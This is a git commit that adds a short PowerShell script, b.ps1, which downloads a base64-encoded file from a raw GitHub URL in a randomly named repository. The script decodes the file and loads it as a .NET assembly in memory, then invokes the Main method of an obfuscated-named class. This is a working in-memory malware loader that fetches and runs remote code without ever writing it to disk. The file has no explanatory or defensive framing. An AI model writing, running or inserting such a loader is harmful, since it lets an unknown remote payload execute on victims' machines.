cb5bdcf17450b19396c80a0119d972509820e918
prowben <158460402+prowben@users.noreply.github.com>
2024-06-01 19:05:02 +0300

    Create b.ps1

---
+++ b.ps1
@@ -0,0 +1,21 @@
+
+
+$url = "https://raw.githubusercontent.com/HeadShotXx/asjdhx-aosx-asj1/main/fuhrer.txt"
+
+$response = Invoke-WebRequest -Uri $url -UseBasicParsing
+
+if ($response.StatusCode -eq 200) {
+    $base64String = $response.Content
+
+    $byteArray = [System.Convert]::FromBase64String($base64String)
+    $assembly = [System.Reflection.Assembly]::Load($byteArray)
+
+    $class = $assembly.GetType("QJAMsrpfhk.HH")
+    $method = $class.GetMethod("Main")
+
+    $instance = [System.Activator]::CreateInstance($class)
+    $method.Invoke($instance, @())
+
+} else {
+    Write-Host "Failed to download base64String. Status code: $($response.StatusCode)"
+}
